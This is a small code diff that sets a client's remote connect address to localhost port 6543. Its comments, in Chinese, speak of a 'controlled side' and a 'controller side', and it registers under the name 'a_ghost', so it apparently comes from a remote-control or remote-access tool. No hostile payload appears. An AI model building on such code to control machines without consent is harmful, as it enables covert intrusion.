@@ -20,7 +20,7 @@ using namespace std;
 #define REG_NAME "a_ghost"
 
 // 远程地址
-CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "", 0, CLIENT_TYPE_ONE};
+CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", 6543, CLIENT_TYPE_ONE};
 
 // 应用程序状态（1-被控端退出 2-主控端退出 3-其他条件）
 BOOL g_bExit = 0;
